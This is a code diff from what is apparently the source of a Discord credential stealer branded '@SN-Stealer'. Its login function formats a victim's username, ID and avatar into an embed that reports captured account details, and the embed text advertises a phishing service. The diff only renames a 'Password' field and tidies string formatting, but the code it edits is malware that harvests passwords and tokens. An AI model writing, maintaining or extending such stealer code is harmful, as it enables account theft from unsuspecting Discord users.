@@ -618,13 +618,13 @@ const login = async (email, password, token) => {
             inline: true,
           },
           {
-            name: '<a:4536gun4:985673435860586557> @SN - Password:',
+            name: '<a:4536gun4:985673435860586557> @SN - Information:',
             value: `\`\`\`✅ User is reconnected.\n\nThank you for using @SN-Stealer, if you want other service, all this passes on sn-fishing.cc\`\`\``,
             inline: true,
           },
         ],
         author: {
-          name: json.username + '#' + json.discriminator + ' ' + '('+json.id+')',
+          name: json.username + '#' + json.discriminator + ' ('+json.id+')',
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
